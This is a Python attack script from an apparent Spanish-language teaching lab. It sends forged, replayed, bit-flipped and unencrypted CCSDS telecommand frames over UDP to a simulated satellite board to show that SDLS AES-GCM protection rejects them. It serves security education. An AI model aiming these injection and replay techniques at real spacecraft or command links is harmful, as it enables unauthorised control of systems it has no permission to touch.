"""
Atacante - fase 2. El enlace ya esta protegido con SDLS (AES-256-GCM).
Los mismos ataques de la fase 1 deberian fallar, y cada intento deberia
aparecer como EVENTO DE SEGURIDAD en la consola de tierra.

El atacante NO tiene las claves (no lee ground/keys_f2.json).

Escenarios:
  inject          el ataque de la fase 1 tal cual: trama CCSDS valida, sin SDLS.
  forge           trama con cabecera SDLS bien formada, pero cifrada con una clave
                  inventada: la MAC no cuadra.
  replay <hex>    reenvia una trama capturada (copia una linea "[AIRE] TC cifrado
                  enviado" de la consola de tierra): el IV ya se uso.
  tamper <hex>    cambia un bit del texto cifrado de una trama capturada y
                  RECALCULA el CRC: pasa el CRC, pero la MAC lo detecta.
  espiar <hex>    intenta leer una trama capturada: solo ve la cabecera en claro.

Uso (en PowerShell, desde la carpeta del proyecto):
    py attacks\\attack_f2.py --sat 192.168.33.105 inject
    py attacks\\attack_f2.py --sat 192.168.33.105 replay 00c5...

Solo contra tu propio C5, en tu propia red.
"""

import argparse
import os
import random
import secrets
import socket
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "ground"))

from ccsds import frames, sdls, services  # noqa: E402
from ccsds.frames import CcsdsError  # noqa: E402

TC_PORT = 10025


def send_and_listen(sat: tuple, frame: bytes, wait: float = 2.0) -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.settimeout(wait)
        s.sendto(frame, sat)
        print(f"[ATACANTE] Trama enviada ({len(frame)} bytes): {frame.hex()}")
        try:
            data, _ = s.recvfrom(2048)
            print(f"[ATACANTE] El satelite ha respondido ({len(data)} bytes), pero va cifrado: {data[:24].hex()}...")
        except (socket.timeout, ConnectionResetError):
            print("[ATACANTE] Sin respuesta: el satelite ya no habla con quien no tiene la clave.")
            print("           Mira la consola de tierra: alli llega el EVENTO DE SEGURIDAD.")


def fix_crc(frame: bytearray) -> bytes:
    crc = frames.crc16(bytes(frame[:-2]))
    frame[-2:] = bytes([crc >> 8, crc & 0xFF])
    return bytes(frame)


def espiar(frame: bytes) -> None:
    try:
        f = frames.parse_tc_frame(frame)
    except CcsdsError as e:
        print(f"[ATACANTE] Trama ilegible: {e}")
        return
    print("[ATACANTE] Lo que se ve en claro:")
    print(f"  SCID 0x{f.scid:03X}, canal {f.vcid}, N(S) {f.seq}")
    if len(f.data) < sdls.SEC_OVERHEAD + 1:
        print("  Esta trama NO lleva SDLS: el Space Packet se lee entero:", f.data.hex())
        return
    spi = int.from_bytes(f.data[:2], "big")
    iv = f.data[2:14]
    ct = f.data[14:-16]
    print(f"  SPI {spi}, IV #{sdls.iv_to_counter(iv)}")
    print(f"  Datos ({len(ct)} bytes): {ct.hex()}  <- cifrados, no se sabe que comando es")
    print(f"  MAC: {f.data[-16:].hex()}")


def main(argv=None) -> int:
    p = argparse.ArgumentParser(description="Atacante (fase 2, solo para tu laboratorio)")
    p.add_argument("--sat", required=False, help="IP de TU C5")
    p.add_argument("--port", type=int, default=TC_PORT, help=argparse.SUPPRESS)
    sub = p.add_subparsers(dest="escenario", required=True)
    sub.add_parser("inject", help="el ataque de la fase 1: trama sin SDLS")
    sub.add_parser("forge", help="trama SDLS con una clave inventada")
    for name, txt in (("replay", "reenviar una trama capturada"),
                      ("tamper", "cambiar un bit cifrado y recalcular el CRC"),
                      ("espiar", "intentar leer una trama capturada")):
        sp = sub.add_parser(name, help=txt)
        sp.add_argument("hex")
    args = p.parse_args(argv)

    if args.escenario != "espiar" and not args.sat:
        p.error("falta --sat con la IP de tu C5")
    sat = (args.sat, args.port)
    red = bytes([255, 0, 0])

    if args.escenario == "inject":
        pkt = services.build_tc_packet(services.TC_SET_COLOR, random.randint(0, 0x3FFF), red)
        frame = frames.build_tc_frame(pkt, seq=random.randint(0, 255))
        print("[ATACANTE] Repito el ataque de la fase 1: trama CCSDS perfecta, sin SDLS.")
        send_and_listen(sat, frame)
        return 0

    if args.escenario == "forge":
        fake = sdls.SecurityAssociation(sdls.SPI_TC, secrets.token_bytes(32))
        pkt = services.build_tc_packet(services.TC_SET_COLOR, random.randint(0, 0x3FFF), red)
        # IV enorme: si el satelite moviera la ventana anti-replay antes de comprobar
        # la MAC, este ataque bloquearia a la tierra legitima. No deberia pasar.
        frame = sdls.build_secure_tc_frame(fake, pkt, seq=random.randint(0, 255), iv_counter=2**63)
        print("[ATACANTE] Trama SDLS bien formada (SPI 1, IV enorme), cifrada con una clave inventada.")
        send_and_listen(sat, frame)
        return 0

    try:
        frame = bytes.fromhex(args.hex)
    except ValueError:
        print("[ATACANTE] Ese hex no es valido. Copia la trama completa de la consola de tierra.")
        return 1

    if args.escenario == "espiar":
        espiar(frame)
        return 0
    if args.escenario == "tamper":
        if len(frame) < 5 + sdls.SEC_OVERHEAD + 3:
            print("[ATACANTE] Esa trama no lleva SDLS. Usa una de gs_f2.py.")
            return 1
        mod = bytearray(frame)
        mod[5 + sdls.SEC_HEADER_LEN + 2] ^= 0x01   # un bit del texto cifrado
        frame = fix_crc(mod)
        print("[ATACANTE] He cambiado un bit del texto cifrado y he recalculado el CRC.")
    else:
        print("[ATACANTE] Reenvio una trama capturada, sin modificarla.")
    send_and_listen(sat, frame)
    return 0


if __name__ == "__main__":
    sys.exit(main())
